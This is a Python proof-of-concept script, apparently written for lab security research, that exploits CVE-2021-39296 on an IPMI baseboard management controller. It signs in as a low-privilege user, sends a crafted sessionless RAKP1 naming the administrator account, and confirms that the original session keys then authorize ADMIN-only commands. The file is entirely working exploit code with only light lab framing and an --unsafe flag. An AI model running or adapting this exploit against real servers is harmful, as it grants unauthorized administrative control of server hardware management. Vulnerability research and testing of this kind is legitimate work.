#!/usr/bin/env python3
# z-artifact: a9782d97-8b7a-48a9-97a2-868038fac80f
"""Bounded CVE-2021-39296 active-session relabel probe for the X14 lab BMC.

Authenticates a USER session, proves an ADMIN-only read is denied, sends one
sessionless RAKP1 naming the administrator account without RAKP3, then repeats
the privilege request and read using the original session keys.  It performs
no persistent writes, denial-of-service payload, or memory-read chain.
"""

from __future__ import annotations

import argparse
import getpass
import secrets
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from zipmi.core import IPMIError, Session
from zipmi.scapy_ipmi.rakp import RAKP1, RAKP2


def run_probe(
    session: Session,
    admin_user: str,
    *,
    channel: int = 1,
    oracle_user_id: int = 2,
) -> dict[str, object]:
    """Run the bounded relabel proof on an already-active USER session."""
    try:
        session._set_privilege(4)
    except IPMIError as exc:
        if exc.comp_code != 0x81:
            raise
    else:
        raise IPMIError("baseline unexpectedly obtained ADMIN; aborting relabel probe")

    before_cc, _ = session.send_raw(
        0x06, 0x44, bytes([channel & 0x0F, oracle_user_id & 0x3F])
    )
    if before_cc == 0:
        raise IPMIError("ADMIN oracle succeeded before relabel; aborting")

    rakp1 = RAKP1(
        managed_session_id=session.session_id,
        remote_random=secrets.token_bytes(16),
        role=0x14,
        user_name=admin_user.encode("utf-8"),
    )
    reply = session._send_lanplus_outside_session(0x12, bytes(rakp1))
    if not reply.haslayer(RAKP2):
        raise IPMIError("relabel RAKP1 received no RAKP2")
    status = int(reply[RAKP2].rmcp_status)
    if status != 0:
        raise IPMIError(f"relabel RAKP2 rejected with status 0x{status:02x}")

    session._set_privilege(4)
    after_cc, after_data = session.send_raw(
        0x06, 0x44, bytes([channel & 0x0F, oracle_user_id & 0x3F])
    )
    if after_cc != 0:
        raise IPMIError(f"ADMIN oracle still denied after relabel: cc=0x{after_cc:02x}")

    return {
        "session_id": session.session_id,
        "before_cc": before_cc,
        "rakp2_status": status,
        "after_cc": after_cc,
        "after_data": after_data,
    }


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("-H", "--host", required=True)
    parser.add_argument("-U", "--user", required=True,
                        help="existing low-privilege IPMI user")
    parser.add_argument("-P", "--password",
                        help="low-privilege password (prompted if omitted)")
    parser.add_argument("-p", "--port", type=int, default=623)
    parser.add_argument("--admin-user", default="ADMIN",
                        help="enabled administrator account to name in RAKP1")
    parser.add_argument("--channel", type=lambda value: int(value, 0), default=1)
    parser.add_argument("--oracle-user-id", type=lambda value: int(value, 0), default=2)
    parser.add_argument("--unsafe", action="store_true",
                        help="acknowledge live session-authorization manipulation")
    return parser.parse_args(argv)


def main(argv: list[str] | None = None) -> int:
    args = parse_args(argv)
    if not args.unsafe:
        print("error: add --unsafe to acknowledge the live exploit probe", file=sys.stderr)
        return 2
    password = args.password
    if password is None:
        password = getpass.getpass(f"Password for {args.user}: ")

    session = Session(
        args.host,
        args.user,
        password,
        priv=2,
        lanplus=True,
        cipher_suite=None,
    )
    session.transport.port = args.port
    try:
        with session:
            result = run_probe(
                session,
                args.admin_user,
                channel=args.channel,
                oracle_user_id=args.oracle_user_id,
            )
    except Exception as exc:
        print(f"FAILED: {exc}", file=sys.stderr)
        return 1

    print(f"active USER session: 0x{result['session_id']:08x}")
    print(f"before relabel: ADMIN oracle cc=0x{result['before_cc']:02x}")
    print(f"relabel RAKP2: status=0x{result['rakp2_status']:02x} (no RAKP3 sent)")
    print(f"after relabel: ADMIN oracle cc=0x{result['after_cc']:02x} "
          f"data={result['after_data'].hex()}")
    print("CONFIRMED: original low-privilege session keys now authorize ADMIN commands")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
